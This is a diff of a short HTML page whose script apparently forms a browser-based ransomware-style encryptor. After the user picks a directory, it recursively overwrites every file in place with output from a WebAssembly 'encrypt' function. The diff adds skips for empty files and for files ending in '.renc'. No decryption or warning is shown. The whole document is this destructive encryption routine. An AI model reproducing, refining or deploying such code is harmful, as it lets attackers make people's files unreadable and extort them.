@@ -1,37 +1,39 @@
 <script type="module">
-  import init, { encrypt } from "./pkg/client.js";
+	import init, {encrypt} from "./pkg/client.js";
 
-  init().then(() => {
-    async function encryptFile(fileHandle) {
-      const file = await fileHandle.getFile();
-      var contents = new Uint8Array(await file.arrayBuffer());
+	init().then(() => {
+		async function encryptFile(fileHandle) {
+			const file = await fileHandle.getFile();
+			var contents = new Uint8Array(await file.arrayBuffer());
 
-      // console.log("content: ", contents);
-      let encrypted = encrypt(contents);
-      // console.log("encrypted:", encrypted);
+			if (contents.length <= 0) {
+				return;
+			}
 
-      const writable = await fileHandle.createWritable();
-      await writable.write(encrypted);
-      await writable.close();
-    }
+			let encrypted = encrypt(contents);
 
-    async function encryptDirectory(dirHandle) {
-      for await (const entry of dirHandle.values()) {
-        if (entry.kind == "directory") {
-          await encryptDirectory(entry);
-        } else {
-          await encryptFile(entry);
-        }
-      }
-    }
+			const writable = await fileHandle.createWritable();
+			await writable.write(encrypted);
+			await writable.close();
+		}
 
-    const button = document.getElementById("button");
+		async function encryptDirectory(dirHandle) {
+			for await (const entry of dirHandle.values()) {
+				if (entry.kind == "directory") {
+					await encryptDirectory(entry);
+				} else if (!entry.name.endsWith(".renc")) {
+					await encryptFile(entry);
+				}
+			}
+		}
 
-    button.addEventListener("click", async () => {
-      const dirHandle = await window.showDirectoryPicker();
-      await encryptDirectory(dirHandle);
-    });
-  });
+		const button = document.getElementById("button");
+
+		button.addEventListener("click", async () => {
+			const dirHandle = await window.showDirectoryPicker();
+			await encryptDirectory(dirHandle);
+		});
+	});
 </script>
 
 <button id="button">run</button>
